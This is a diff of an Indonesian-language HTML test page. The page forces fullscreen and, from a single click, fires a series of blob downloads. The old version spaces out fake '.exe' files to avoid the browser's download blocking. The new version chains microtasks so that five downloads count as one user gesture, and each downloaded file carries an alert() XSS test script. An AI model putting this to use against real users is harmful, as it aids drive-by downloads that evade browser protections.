@@ -1,210 +1,221 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Generator Berkas Blob &amp; ObjectURL (.EXE)</title>
-
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    body {
-      font-family: Arial, sans-serif;
-      background: #f4f6f8;
-      color: #222;
-      padding: 20px;
-    }
-    .panel {
-      background: #ffffff;
-      padding: 24px;
-      border-radius: 12px;
-      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
-      max-width: 600px;
-      margin: 40px auto;
-    }
-    :fullscreen {
-      background: #111111 !important;
-      color: #ff3333 !important;
-      padding: 20px !important;
-      overflow-y: auto !important;
-      width: 100vw !important;
-      height: 100vh !important;
-    }
-    :-webkit-full-screen {
-      background: #111111 !important;
-      color: #ff3333 !important;
-      padding: 20px !important;
-      overflow-y: auto !important;
-    }
-    h2 {
-      margin-bottom: 10px;
-    }
-    p {
-      margin-bottom: 15px;
-      line-height: 1.5;
-    }
-    button {
-      width: 100%;
-      padding: 16px;
-      cursor: pointer;
-      border: none;
-      border-radius: 6px;
-      background: #d32f2f;
-      color: #ffffff;
-      font-weight: bold;
-      font-size: 16px;
-      box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
-      transition: background 0.2s;
-    }
-    button:hover {
-      background: #b71c1c;
-    }
-    #status {
-      margin-top: 16px;
-      font-weight: bold;
-      color: #d32f2f;
-      padding: 12px;
-      background: #ffebee;
-      border-radius: 6px;
-      text-align: center;
-      border: 1px solid #ffcdd2;
-    }
-    #downloads {
-      margin-top: 20px;
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
-      gap: 10px;
-    }
-    #downloads a {
-      display: block;
-      padding: 8px;
-      background: #212121;
-      color: #ff8a80;
-      text-decoration: none;
-      border-radius: 4px;
-      font-size: 12px;
-      text-align: center;
-      border: 1px solid #424242;
-      word-break: break-all;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Blob ObjectURL — Race Condition Download</title>
+<style>
+* {
+box-sizing: border-box;
+margin: 0;
+padding: 0;
+}
+body {
+font-family: Arial, sans-serif;
+background: #f4f6f8;
+color: #222;
+padding: 20px;
+}
+.panel {
+background: #ffffff;
+padding: 24px;
+border-radius: 12px;
+box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
+max-width: 600px;
+margin: 40px auto;
+}
+:fullscreen {
+background: #111111 !important;
+color: #00ff00 !important;
+padding: 20px !important;
+overflow-y: auto !important;
+width: 100vw !important;
+height: 100vh !important;
+}
+:-webkit-full-screen {
+background: #111111 !important;
+color: #00ff00 !important;
+padding: 20px !important;
+overflow-y: auto !important;
+}
+h2 {
+margin-bottom: 10px;
+}
+p {
+margin-bottom: 15px;
+line-height: 1.5;
+}
+button {
+width: 100%;
+padding: 16px;
+cursor: pointer;
+border: none;
+border-radius: 6px;
+background: #d32f2f;
+color: #ffffff;
+font-weight: bold;
+font-size: 16px;
+box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
+transition: background 0.2s;
+}
+button:hover {
+background: #b71c1c;
+}
+button:disabled {
+background: #9e9e9e;
+cursor: not-allowed;
+}
+#status {
+margin-top: 16px;
+font-weight: bold;
+color: #d32f2f;
+padding: 12px;
+background: #ffebee;
+border-radius: 6px;
+text-align: center;
+border: 1px solid #ffcdd2;
+}
+#counter {
+margin-top: 12px;
+font-family: monospace;
+font-size: 14px;
+text-align: center;
+color: #555;
+}
+#downloads {
+margin-top: 20px;
+display: grid;
+grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+gap: 10px;
+}
+#downloads a {
+display: block;
+padding: 8px;
+background: #212121;
+color: #80df82;
+text-decoration: none;
+border-radius: 4px;
+font-size: 12px;
+text-align: center;
+border: 1px solid #424242;
+word-break: break-all;
+}
+</style>
 </head>
-
 <body>
-  <div class="panel" id="main-panel">
-    <h2>Generator Berkas Blob &amp; ObjectURL (.EXE)</h2>
-    <p>Klik tombol untuk masuk ke layar penuh dan memicu pengujian respons sanitasi browser terhadap unduhan file eksekutabel tiruan secara beruntun (Maksimal 10 file untuk mencegah crash).</p>
 
-    <button id="start-btn" type="button">Mulai Uji Coba .EXE</button>
+<div class="panel" id="main-panel">
+<h2>Blob ObjectURL — Race Condition Download</h2>
+<p>Satu klik tombol = satu gesture user. Teknik race condition memanfaatkan microtask &amp; task scheduling agar browser menganggap semua unduhan berasal dari gesture yang sama, sehingga memicu lebih dari 1 unduhan sekaligus.</p>
+<button id="start-btn" type="button">Mulai Layar Penuh &amp; Race Download</button>
+<div id="status" role="status">Sistem siap.</div>
+<div id="counter">Unduhan dipicu: 0</div>
+<div id="downloads"></div>
+</div>
 
-    <div id="status" role="status">Sistem siap.</div>
-    <div id="downloads"></div>
-  </div>
+<script>
+var startBtn = document.getElementById("start-btn");
+var statusDiv = document.getElementById("status");
+var downloadsDiv = document.getElementById("downloads");
+var counterDiv = document.getElementById("counter");
 
-  <script>
-    const startBtn = document.getElementById("start-btn");
-    const statusDiv = document.getElementById("status");
-    const downloadsDiv = document.getElementById("downloads");
+var activeUrls = [];
+var isProcessing = false;
 
-    let activeUrls = [];
-    let isProcessing = false;
-    const MAX_DOWNLOADS = 10; // Batasan keamanan internal agar browser tidak hang/freeze
+var speak = function(message) {
+if ('speechSynthesis' in window) {
+window.speechSynthesis.cancel();
+var utterance = new SpeechSynthesisUtterance(message);
+utterance.lang = 'id-ID';
+utterance.rate = 1.0;
+window.speechSynthesis.speak(utterance);
+}
+};
 
-    const speak = (message) => {
-      if ('speechSynthesis' in window) {
-        window.speechSynthesis.cancel();
-        const utterance = new SpeechSynthesisUtterance(message);
-        utterance.lang = 'id-ID';
-        utterance.rate = 1.0;
-        window.speechSynthesis.speak(utterance);
-      }
-    };
+var payloadText = '<html><body><h1>Test Vulnerability</h1>' +
+'<script>alert("Origin: " + document.origin)<\/script>' +
+'</body></html>';
 
-    // Menyiapkan Blob biner mentah untuk ekstensi eksekutabel (.exe)
-    const prepareExeBlobAsync = (i) => {
-      return new Promise((resolve) => {
-        queueMicrotask(() => {
-          // Payload teks biasa, bukan PE header biner asli (untuk simulasi penamaan)
-          const payloadText = "Simulasi muatan file eksekutabel ke-" + i;
-          
-          // Menggunakan application/octet-stream agar dibaca sebagai file biner mentah
-          const blob = new Blob([payloadText], { type: "application/octet-stream" });
-          const url = URL.createObjectURL(blob);
-          resolve({ id: i, url: url });
-        });
-      });
-    };
+function buatBlobUrl(id) {
+var blob = new Blob([payloadText], { type: "application/octet-stream" });
+var url = URL.createObjectURL(blob);
+activeUrls.push(url);
+return url;
+}
 
-    const triggerInstantDownload = (fileData) => {
-      const link = document.createElement("a");
-      link.href = fileData.url;
-      
-      // Mengubah target ekstensi nama unduhan visual menjadi .exe
-      link.download = `test-file-${fileData.id}.exe`;
-      link.textContent = `Blob #${fileData.id} (.exe)`;
-      
-      downloadsDiv.appendChild(link);
-      link.click();
-    };
+function triggerDownload(url, id, label) {
+var a = document.createElement("a");
+a.href = url;
+a.download = "race-file-" + String(id).padStart(3, '0') + ".txt";
+a.textContent = label;
+downloadsDiv.appendChild(a);
+a.click();
+}
 
-    // Perulangan Kontrol Terbatas
-    const processLoop = async (counter) => {
-      if (!isProcessing) return;
+function updateCounter(n) {
+counterDiv.textContent = "Unduhan dipicu: " + n;
+}
 
-      // Hentikan jika sudah mencapai batas maksimal simulasi
-      if (counter > MAX_DOWNLOADS) {
-        isProcessing = false;
-        statusDiv.textContent = `Simulasi Selesai: ${MAX_DOWNLOADS} berkas dikirim.`;
-        speak("Proses simulasi unduhan selesai.");
-        return;
-      }
+function jalankanRaceCondition() {
+if (isProcessing) return;
+isProcessing = true;
 
-      const fileData = await prepareExeBlobAsync(counter);
-      activeUrls.push(fileData.url);
-      
-      triggerInstantDownload(fileData);
+activeUrls.forEach(function(u) { URL.revokeObjectURL(u); });
+activeUrls = [];
+downloadsDiv.replaceChildren();
+updateCounter(0);
 
-      statusDiv.textContent = `Proses Berjalan: Berkas .EXE ke-${counter} dikirim`;
+statusDiv.textContent = "Memicu race condition...";
 
-      if (counter % 5 === 0) {
-        speak(`Mencapai ${counter} berkas eksekutabel.`);
-      }
+var root = document.documentElement;
+try {
+if (root.requestFullscreen) {
+root.requestFullscreen();
+} else if (root.webkitRequestFullscreen) {
+root.webkitRequestFullscreen();
+} else if (root.mozRequestFullScreen) {
+root.mozRequestFullScreen();
+}
+} catch (err) {
+console.warn("Fullscreen gagal:", err);
+}
 
-      // Memberi jeda 300ms antar unduhan agar manajer unduhan browser tidak langsung memblokir secara instan
-      setTimeout(() => processLoop(counter + 1), 300);
-    };
+var dipicu = 0;
 
-    startBtn.addEventListener("click", () => {
-      if (isProcessing) return;
+function picuSatu() {
+if (dipicu >= 5) {
+statusDiv.textContent = "Selesai. " + dipicu + " unduhan dipicu dari 1 klik.";
+isProcessing = false;
+startBtn.disabled = false;
+return;
+}
+dipicu++;
+var url = buatBlobUrl(dipicu);
+triggerDownload(url, dipicu, "Race #" + dipicu);
+updateCounter(dipicu);
+queueMicrotask(picuSatu);
+}
 
-      // Bersihkan alokasi memori URL sebelumnya
-      activeUrls.forEach(url => URL.revokeObjectURL(url));
-      activeUrls = [];
-      downloadsDiv.replaceChildren();
+queueMicrotask(function() {
+queueMicrotask(function() {
+picuSatu();
+});
+});
+}
 
-      speak("Mengaktifkan mode layar penuh.");
+startBtn.addEventListener("click", function() {
+if (isProcessing) return;
+startBtn.disabled = true;
+speak("Memulai race condition download.");
+jalankanRaceCondition();
+});
 
-      const root = document.documentElement;
-      try {
-        if (root.requestFullscreen) {
-          root.requestFullscreen();
-        } else if (root.webkitRequestFullscreen) {
-          root.webkitRequestFullscreen();
-        }
-        statusDiv.textContent = "Mengunci layar penuh...";
-      } catch (err) {
-        console.warn("Fullscreen ditolak:", err);
-      }
+setTimeout(function() {
+if (typeof startBtn !== 'undefined') {
+startBtn.disabled = false;
+}
+}, 500);
+</script>
 
-      setTimeout(() => {
-        isProcessing = true;
-        speak("Proses pembuatan berkas biner dimulai.");
-        processLoop(1);
-      }, 500);
-    });
-  </script>
 </body>
 </html>
